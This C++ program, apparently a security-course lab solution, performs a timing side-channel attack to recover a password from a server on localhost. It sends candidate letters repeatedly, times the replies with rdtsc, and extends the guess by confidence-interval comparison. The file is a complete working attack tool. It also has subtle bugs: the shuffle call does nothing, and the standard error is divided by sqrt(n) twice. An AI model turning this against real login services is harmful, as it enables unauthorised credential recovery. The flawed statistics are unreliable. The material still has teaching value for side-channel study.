#include <iostream>
#include <sstream>
#include <map>
#include <algorithm>
#include <cstdlib>
#include <ctime>
#include <cstring>
#include <cerrno>
using namespace std;

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/time.h>
#include <wait.h>
#include <unistd.h>
#include <inttypes.h>
#include <cmath>
#include <iomanip>

bool is_password_ok(const string &response);
static __inline__ uint64_t rdtsc();
int socket_to_server(const char *IP, int port);
string read_packet(int socket);

class connection_closed
{
};
class socket_error
{
};

class letter_stats
{
public:
    uint64_t sum;
    uint64_t sq_sum;
    double mean;
    double variance;
    double std_dev;
    double lo_ci;
    double hi_ci;

    letter_stats()
    {
        this->sum      = 0;
        this->sq_sum   = 0;
        this->mean     = 0.0;
        this->variance = 0.0;
        this->std_dev  = 0.0;
        this->lo_ci    = 0.0;
        this->hi_ci    = 0.0;
    }
};

const char LETTERS[26] = {'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'};

int main(int argc, char *argv[])
{
    string username;
    int max_count;
    string pwd;

    if (argc < 2)
    {
        cout << "Username: y396zhao" << endl;
        username = "y396zhao\n";
    }
    else
    {
        cout << "Username: " << argv[1] << endl;
        username = argv[1] + string("\n");
    }

    if (argc < 3)
    {
        max_count = 15000;
    }
    else
    {
        max_count = atoi(argv[2]);
    }

    if (argc < 4)
    {
        pwd = "";
    }
    else
    {
        pwd = argv[3];
    }

    int socket = socket_to_server("127.0.0.1", 10458);

    if (socket != -1)
    {
        // transmit username
        send(socket, username.c_str(), strlen(username.c_str()), MSG_NOSIGNAL);
        cout << "Number of Trials: " << max_count << "\n"
             << endl;
        usleep(100000);

        while (true)
        {
            // guess passwords
            if (!pwd.empty())
            {
                send(socket, (pwd + "\n").c_str(), strlen((pwd + "\n").c_str()), MSG_NOSIGNAL);
                string response = read_packet(socket);

                if (is_password_ok(response))
                {
                    cout << "Correct password is: " << pwd << endl;
                    return 0;
                }
            }

            char letters[26];
            strncpy(letters, LETTERS, 26);

            map<char, letter_stats> map;

            // push letters
            for (int i = 0; i < 26; i++)
            {
                letter_stats ls;
                map[letters[i]] = ls;
            }

            char   next_letter   = 'a';
            double current_mean  = 0.0;
            double current_lo_ci = 0.0;
            double max_hi_ci     = 0.0;

            for (int j = 0; j < max_count; j++)
            {
                random_shuffle(begin(letters), begin(letters));

                for (int i = 0; i < 26; i++)
                {
                    char     l           = letters[i];
                    string   current_pwd = (pwd + l) + "\n";
                    uint64_t start       = rdtsc();
                    send(socket, current_pwd.c_str(), strlen(current_pwd.c_str()), MSG_NOSIGNAL);
                    read_packet(socket);
                    uint64_t end      = rdtsc();
                    uint64_t duration = end - start;

                    map[l].sum    += duration;
                    map[l].sq_sum += duration * duration;
                }
            }

            // stats
            cout << left << setw(20) << "Password" << setw(20) << "Mean" << setw(20) << "Low 95% CI" << setw(20) << "High 95% CI" << endl;

            for (int i = 0; i < 26; i++)
            {
                char l           = letters[i];
                map [l].mean     = map[l].sum / (double)max_count;
                map [l].variance = (map[l].sq_sum - (double)max_count * map[l].mean * map[l].mean) / ((double)max_count - 1);
                map [l].std_dev  = sqrt(map[l].variance / (double)max_count);
                map [l].lo_ci    = map[l].mean - 1.96 * map[l].std_dev / sqrt(max_count);
                map [l].hi_ci    = map[l].mean + 1.96 * map[l].std_dev / sqrt(max_count);

                // update next letter if it has greater mean and no overlapping
                if (map[l].mean > current_mean && map[l].lo_ci > max_hi_ci)
                {
                    next_letter   = l;
                    current_mean  = map[l].mean;
                    current_lo_ci = map[l].lo_ci;
                }
                // update max higher confidence interval
                else if (map[l].hi_ci > current_lo_ci)
                {
                    max_hi_ci = max(max_hi_ci, map[l].hi_ci);
                }

                cout << left << setw(20) << pwd + l << setw(20) << map[l].mean << setw(20) << map[l].lo_ci << setw(20) << map[l].hi_ci << endl;
            }

            // check overlapping
            if (map[next_letter].lo_ci > max_hi_ci)
            {
                pwd += next_letter;
                cout << "\nNext password input should be: " << pwd << "\n"
                     << endl;
            }
            else
            {
                cout << "\nOverlapping found, increase number of trials" << endl;
                return 0;
            }
        }
    }

    return 0;
}

bool is_password_ok(const string &response)
{
    return response.compare("ok") == 0;
}

static __inline__ uint64_t rdtsc()
{
    uint32_t hi, lo;
    __asm__ __volatile__("rdtsc"
                         : "=a"(lo), "=d"(hi));
    return ((uint64_t)lo) | (((uint64_t)hi) << 32);
}

int socket_to_server(const char *IP, int port)
{
    struct sockaddr_in address;

    address.sin_family      = AF_INET;
    address.sin_addr.s_addr = inet_addr(IP);
    address.sin_port        = htons(port);

    int sock = socket(AF_INET, SOCK_STREAM, 0);

    if (connect(sock, (struct sockaddr *)&address, sizeof(address)) == -1)
    {
        return -1;
    }

    return sock;
}

string read_packet(int client_socket)
{
    string msg;

    const int size = 8192;
    char buffer[size];

    while (true)
    {
        int bytes_read = recv(client_socket, buffer, sizeof(buffer) - 2, 0);
        // Though extremely unlikely in our setting --- connection from
        // localhost, transmitting a small packet at a time --- this code
        // takes care of fragmentation  (one packet arriving could have
        // just one fragment of the transmitted message)

        if (bytes_read > 0)
        {
            buffer[bytes_read]     = '\0';
            buffer[bytes_read + 1] = '\0';

            const char *packet = buffer;
            while (*packet != '\0')
            {
                msg    += packet;
                packet += strlen(packet) + 1;

                if (msg.length() > 1 && msg[msg.length() - 1] == '\n')
                {
                    istringstream buf(msg);
                    string msg_token;
                    buf >> msg_token;
                    return msg_token;
                }
            }
        }

        else if (bytes_read == 0)
        {
            close(client_socket);
            throw connection_closed();
        }

        else
        {
            cerr << "Error " << errno << endl;
            throw socket_error();
        }
    }

    throw connection_closed();
}
